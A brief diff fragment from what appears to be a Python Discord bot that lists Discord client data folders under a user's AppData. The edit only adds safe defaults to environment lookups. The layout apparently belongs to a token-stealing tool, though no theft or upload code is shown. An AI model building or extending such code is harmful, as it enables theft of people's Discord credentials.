@@ -34,8 +34,9 @@ import platform
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='$$', intents=intents)
 
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
+LOCAL = os.getenv("LOCALAPPDATA", "")
+ROAMING = os.getenv("APPDATA", "")
+
 PATHS = {
     'Discord': ROAMING + '\\discord',
     'Discord Canary': ROAMING + '\\discordcanary',
